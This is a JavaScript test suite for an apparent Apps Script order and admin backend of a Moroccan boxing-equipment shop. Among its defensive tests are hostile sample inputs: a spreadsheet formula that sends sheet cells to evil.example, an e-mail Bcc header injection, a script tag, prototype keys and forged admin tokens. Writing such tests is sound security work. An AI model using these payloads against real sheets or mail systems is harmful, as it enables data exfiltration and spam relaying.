// Tests for order-apps-script.gs against the in-memory Apps Script stand-in (gas-mock.js).
// Run: node _ops/test-backend.js
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { makeEnv } = require('./gas-mock');

const KEY = 'kobg-test-admin-key-0123456789';
const RB11 = 'gants-de-sac-rival-rb11-evolution-noir';          // 1750 DH, sizes M L XL
const RB10 = 'gants-de-sac-rival-rb10-intelli-shock-blanc';     // 2390 DH, sizes S M L XL
const RS11 = 'gants-de-sparring-rival-rs11v-evolution-or';      // 2005 DH, sizes incl. "16 oz-s"
const BODY = 'protecteur-corporel-rival-neon';                  // 4559 DH, no size

let seq = 0;
function order(extra = {}) {
  seq += 1;
  return Object.assign({
    orderId: 'KOBG-261027-' + 'ABCDEFGH'[seq % 8] + 'B2' + 'CDEFGHJK'[(seq >> 3) % 8],
    nom: 'Yassine El Amrani', telephone: '06 12 34 56 ' + String(seq % 100).padStart(2, '0'), ville: 'Casablanca',
    items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1750 }], subtotal: 1750, total: 1775, promoCode: '', source: 'panier',
  }, extra);
}
const env0 = (o) => makeEnv(Object.assign({ props: { ADMIN_KEY: KEY } }, o));
const rowsOf = (env, name) => env.sheets[name].rows;
const formulas = (env) => Object.values(env.sheets).flatMap((s) => s.rows.flat()).filter((v) => v && typeof v === 'object' && v.formula);

test('health check answers with the version', () => {
  const r = env0().get();
  assert.equal(r.ok, true);
  assert.ok(r.version);
});

test('valid order is stored with server prices, Gestion line and phone as text', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2, unitPrice: 1750 }, { id: BODY, qty: 1, unitPrice: 4559 }], total: 8059 }));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.subtotal, 8059);
  assert.equal(r.delivery, 0);                                   // >= 2000 DH: free
  assert.equal(r.total, 8059);
  assert.equal(r.adjusted, false);
  assert.equal(r.items[0].name, 'Gants de sac Rival RB11 Evolution');
  assert.equal(r.items[0].size, 'M');
  const rows = rowsOf(env, 'Commandes');
  assert.equal(rows[0][1], 'N° commande');
  const v = rows[1];
  assert.equal(v[1], r.orderId);
  assert.equal(typeof v[3], 'string');
  assert.match(v[3], /^06\d{8}$/);                               // leading 0 kept
  assert.equal(v[5], 'Gants de sac Rival RB11 Evolution x2 / Protecteur corporel Rival');
  assert.equal(v[6], 'M / ');
  assert.equal(v[7], 'Noir / Neon');
  assert.equal(v[8], 3);
  const g = rowsOf(env, 'Gestion');
  assert.deepEqual(g[0].slice(0, 5), ['N° commande', 'Statut', 'Note interne', 'Mis à jour le', 'Historique']);
  assert.equal(g[1][0], r.orderId);
  assert.equal(g[1][1], 'Nouvelle');
});

test('single cheap item pays delivery; promo code applies 10 %', () => {
  const env = env0();
  const a = env.post(order());
  assert.equal(a.total, 1775);
  const b = env.post(order({ promoCode: 'kobg26', total: 1600 }));
  assert.equal(b.discountPct, 10);
  assert.equal(b.discount, 175);
  assert.equal(b.total, 1750 - 175 + 25);
  assert.equal(b.promoCode, 'KOBG26');
});

test('tampered prices and totals are recomputed and flagged', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB10 + '--l', qty: 1, unitPrice: 1, lineTotal: 1 }], subtotal: 1, total: 26 }));
  assert.equal(r.ok, true);
  assert.equal(r.total, 2390);
  assert.equal(r.adjusted, true);
  const g = rowsOf(env, 'Gestion')[1];
  assert.match(g[2], /Total recalculé/);
  assert.equal(rowsOf(env, 'Commandes')[1][13], 2390);
});

test('fake promo codes and prototype keys give no discount', () => {
  const env = env0();
  for (const code of ['FREE100', 'constructor', '__proto__', 'toString']) {
    const r = env.post(order({ promoCode: code }));
    assert.equal(r.ok, true);
    assert.equal(r.discountPct, 0, code);
    assert.equal(r.total, 1775, code);
  }
});

test('unknown products, bad sizes and odd quantities are refused', () => {
  const env = env0();
  const bad = [
    [{ id: 'gants-imaginaires', qty: 1 }], [{ id: 'constructor', qty: 1 }], [{ id: RB11, qty: 1 }],
    [{ id: RB11 + '--s', qty: 1 }], [{ id: BODY + '--m', qty: 1 }], [{ id: RB11 + '--m', qty: 0 }],
    [{ id: RB11 + '--m', qty: 1.5 }], [{ id: RB11 + '--m', qty: 100 }], [{ id: '<script>', qty: 1 }], [], 'x',
    Array.from({ length: 31 }, () => ({ id: BODY, qty: 1 })),
  ];
  for (const items of bad) {
    const r = env.post(order({ items }));
    assert.equal(r.ok, false, JSON.stringify(items).slice(0, 80));
    assert.match(r.error, /^bad_(item|order)$/);
  }
  assert.equal(env.sheets.Commandes, undefined);                 // nothing written
  const ok = env.post(order({ items: [{ id: RS11 + '--16-oz-s', qty: 1 }] }));
  assert.equal(ok.ok, true);
  assert.equal(ok.items[0].size, '16 oz-s');
});

test('same line twice is merged; more than 200 units refused', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2 }, { id: RB11 + '--m', qty: 3 }] }));
  assert.equal(r.items.length, 1);
  assert.equal(r.items[0].qty, 5);
  const big = env.post(order({ items: [RB11 + '--m', RB11 + '--l', RB11 + '--xl'].map((id) => ({ id, qty: 99 })) }));
  assert.equal(big.error, 'bad_order');
});

test('customer fields are validated', () => {
  const env = env0();
  assert.equal(env.post(order({ nom: 'A' })).field, 'nom');
  assert.equal(env.post(order({ nom: '12345' })).field, 'nom');
  assert.equal(env.post(order({ ville: ' ' })).field, 'ville');
  assert.equal(env.post(order({ telephone: '0512345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+33612345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+212 7 12 34 56 78' })).ok, true);
});

test('formula injection never reaches the sheet as a formula', () => {
  const env = env0();
  const r = env.post(order({ nom: '=IMPORTDATA("https://evil.example/?"&A1:A99)', ville: '+HYPERLINK("x")', telephone: '0611111111' }));
  assert.equal(r.ok, true);
  assert.deepEqual(formulas(env), []);
  assert.match(rowsOf(env, 'Commandes')[1][2], /^=IMPORTDATA/);  // kept as plain text
  // admin notes too
  const n = env.post({ action: 'update', key: KEY, id: r.orderId, note: '@SUM(A1)' });
  assert.equal(n.ok, true);
  assert.deepEqual(formulas(env), []);
});

test('control characters and huge strings are cleaned and capped', () => {
  const env = env0();
  const r = env.post(order({ nom: 'Sara\u0000\u202e Bennani\r\n' + 'x'.repeat(500), ville: 'Fès\t\t' }));
  assert.equal(r.ok, true);
  const v = rowsOf(env, 'Commandes')[1];
  assert.ok(v[2].length <= 80);
  assert.ok(!/[\u0000-\u001f\u202e]/.test(v[2]));
  assert.equal(v[4], 'Fès');
});

test('a double submit is stored once; a colliding id from another phone gets a new id', () => {
  const env = env0();
  const o = order();
  const a = env.post(o);
  const b = env.post(o);
  assert.equal(b.ok, true);
  assert.equal(b.duplicate, true);
  assert.equal(b.total, a.total);
  assert.equal(rowsOf(env, 'Commandes').length, 2);
  const c = env.post(Object.assign({}, o, { telephone: '0699999999' }));
  assert.equal(c.ok, true);
  assert.notEqual(c.orderId, a.orderId);
  assert.match(c.orderId, /^KOBG-\d{6}-[A-Z0-9]{4}$/);
});

test('rate limits: 5 orders per phone per hour, 40 per 10 minutes overall', () => {
  const env = env0();
  for (let i = 0; i < 5; i++) assert.equal(env.post(order({ telephone: '0700000001' })).ok, true);
  assert.equal(env.post(order({ telephone: '0700000001' })).error, 'too_many');
  env.cache.clear();
  for (let i = 0; i < 40; i++) assert.equal(env.post(order({ telephone: '06000000' + String(i).padStart(2, '0') })).ok, true);
  assert.equal(env.post(order({ telephone: '0711111111' })).error, 'busy');
});

test('garbage requests are refused without a stack trace', () => {
  const env = env0();
  for (const body of ['', 'not json', '[]', 'null', '"x"', 'x'.repeat(40000)]) {
    const r = env.post(body);
    assert.equal(r.ok, false);
    assert.equal(r.error, 'bad_request');
  }
});

test('catalog unreachable: order kept, client price flagged; last good copy used when known', () => {
  const env = env0({ fetchFail: true });
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1750, name: 'Gants / X', size: 'M', colour: 'Noir' }] }));
  assert.equal(r.ok, true);
  assert.equal(r.adjusted, true);
  assert.match(rowsOf(env, 'Gestion')[1][2], /NON vérifiés/);
  assert.equal(r.items[0].name, 'Gants/X');                      // separator can't break the columns
  const env2 = env0();
  env2.post(order());                                            // fetch works: last good copy saved
  env2.cache.clear();
  env2.fetchFail = true;
  const r2 = env2.post(order({ items: [{ id: RB10 + '--s', qty: 1, unitPrice: 5 }] }));
  assert.equal(r2.total, 2390);
  assert.equal(r2.adjusted, true);
});

test('admin: key missing / too short', () => {
  assert.equal(makeEnv().post({ action: 'auth', key: 'x' }).error, 'no_admin_key');
  const r = makeEnv({ props: { ADMIN_KEY: 'short' } }).post({ action: 'auth', key: 'short' });
  assert.equal(r.error, 'no_admin_key');
  assert.equal(r.reason, 'short');
});

test('admin: wrong keys count down, then lock; signed sessions still work during a lock', () => {
  const env = env0();
  const session = env.post({ action: 'auth', key: KEY, remember: true }).token;
  assert.match(session, /^v1\.\d{10}\./);
  for (let left = 4; left >= 1; left--) {
    const r = env.post({ action: 'auth', key: 'wrong' + left });
    assert.equal(r.error, 'bad_key');
    assert.equal(r.left, left);
  }
  assert.equal(env.post({ action: 'auth', key: 'wrong0' }).error, 'locked');
  assert.equal(env.post({ action: 'list', key: KEY }).error, 'locked');          // the key can't be tried while locked
  assert.equal(env.post({ action: 'list', key: session }).ok, true);             // the owner keeps working
  assert.equal(env.post({ action: 'list', key: 'v1.9999999999.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }).error, 'locked');
});

test('admin: tokens are signed, expire, and die with the key', () => {
  const env = env0();
  const tok = env.post({ action: 'auth', key: KEY }).token;
  assert.notEqual(tok, KEY);
  assert.equal(env.post({ action: 'list', key: tok }).ok, true);
  const [, exp, sig] = tok.split('.');
  assert.equal(env.post({ action: 'list', key: 'v1.' + (Number(exp) + 999999) + '.' + sig }).error, 'bad_key');   // forged expiry
  const old = 'v1.' + (Math.floor(Date.now() / 1000) - 10) + '.' + env.ctx.sign_(KEY, String(Math.floor(Date.now() / 1000) - 10));
  assert.equal(env.post({ action: 'list', key: old }).error, 'expired');
  env.props.set('ADMIN_KEY', 'a-brand-new-admin-key-123');
  assert.equal(env.post({ action: 'list', key: tok }).error, 'bad_key');
});

test('admin: list returns what admin.js renders; update changes status, history and note', () => {
  const env = env0();
  const a = env.post(order({ items: [{ id: RS11 + '--14-oz', qty: 2 }, { id: BODY, qty: 1 }], promoCode: 'KOBG26' }));
  assert.equal(env.post({ action: 'list', key: 'nope' }).error, 'bad_key');
  const tok = env.post({ action: 'auth', key: KEY }).token;
  const l = env.post({ action: 'list', key: tok });
  assert.equal(l.ok, true);
  assert.match(l.today, /^\d{4}-\d{2}-\d{2}$/);
  const o = l.orders[0];
  for (const k of ['row', 'id', 'ts', 'recu', 'day', 'nom', 'tel', 'ville', 'articles', 'taille', 'couleur', 'nb', 'sousTotal', 'promo', 'remise', 'livraison', 'total', 'statut', 'note', 'maj', 'hist']) assert.ok(k in o, k);
  assert.equal(o.id, a.orderId);
  assert.equal(o.day, l.today);
  assert.match(o.recu, /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/);
  assert.match(o.tel, /^0\d{9}$/);
  assert.equal(o.articles, 'Gants de sparring Rival RS11V Evolution x2 / Protecteur corporel Rival');
  assert.equal(o.taille, '14 oz / ');
  assert.equal(o.remise, 10);
  assert.equal(o.total, a.total);
  assert.equal(o.statut, 'Nouvelle');
  assert.equal(o.hist[0].by, 'site');

  assert.equal(env.post({ action: 'update', key: tok, id: o.id, status: 'Volée' }).error, 'bad_status');
  assert.equal(env.post({ action: 'update', key: tok, id: 'KOBG-000000-XXXX', status: 'Livrée' }).error, 'not_found');
  assert.equal(env.post({ action: 'drop', key: tok }).error, 'bad_action');
  const u = env.post({ action: 'update', key: tok, id: o.id, status: 'Confirmée' });
  assert.equal(u.ok, true);
  assert.equal(u.order.statut, 'Confirmée');
  assert.deepEqual(u.order.hist.slice(-1)[0].to, 'Confirmée');
  const n = env.post({ action: 'update', key: tok, id: o.id, note: 'Rappeler après 18 h\nportail bleu' });
  assert.equal(n.order.note, 'Rappeler après 18 h\nportail bleu');
  const l2 = env.post({ action: 'list', key: tok });
  assert.equal(l2.orders[0].statut, 'Confirmée');
  const s = env.post({ action: 'stats', key: tok, period: 'all' });
  assert.equal(s.stats.commandes, 1);
  assert.equal(s.stats.caAEncaisser, a.total);
});

test('admin: works with an older Gestion tab and old rows', () => {
  const env = env0();
  env.post(order());
  const g = env.sheets.Gestion;
  g.rows = [['Commande', 'Etat', 'Notes']];                        // older layout, other names
  const c = env.sheets.Commandes;
  c.rows.push(['27/10/2026 09:15', 'KOBG-261027-OLD1', 'Ancien Client', 612345678, 'Rabat', 'Gants de sac Rival RB11 Evolution', 'L', 'Noir', 1, 1750, '', 0, 25, 1775]);
  g.rows.push(['KOBG-261027-OLD1', 'Expédiée', 'déjà parti']);
  const l = env.post({ action: 'list', key: KEY });
  assert.equal(l.ok, true, JSON.stringify(l));
  const old = l.orders.find((o) => o.id === 'KOBG-261027-OLD1');
  assert.equal(old.statut, 'Expédiée');
  assert.equal(old.note, 'déjà parti');
  assert.equal(old.tel, '0612345678');
  assert.equal(old.recu, '27/10/2026 09:15');
  assert.ok(old.ts > 0);
  const u = env.post({ action: 'update', key: KEY, id: 'KOBG-261027-OLD1', status: 'Livrée' });
  assert.equal(u.order.statut, 'Livrée');
  assert.equal(g.rows[0][0], 'Commande');                          // existing header kept
});

test('notification e-mail when NOTIFY_EMAIL is set, never blocks the order', () => {
  const env = env0({ props: { ADMIN_KEY: KEY, NOTIFY_EMAIL: 'shop@example.org' } });
  const r = env.post(order({ ville: 'Tanger\r\nBcc: x@y.z' }));
  assert.equal(r.ok, true);
  assert.equal(env.mails.length, 1);
  assert.match(env.mails[0].subject, new RegExp(r.orderId));
  assert.ok(!/[\r\n]/.test(env.mails[0].subject));
  env.ctx.MailApp.sendEmail = () => { throw new Error('quota'); };
  assert.equal(env.post(order()).ok, true);
});

test('setup() and generateAdminKey() from the editor', () => {
  const env = makeEnv();
  env.run('generateAdminKey');
  assert.ok(env.props.get('ADMIN_KEY').length >= 32);
  env.run('setup');
  assert.ok(env.sheets.Commandes && env.sheets.Gestion);
  assert.ok(env.logs.some((l) => /ADMIN_KEY configurée/.test(l)));
});
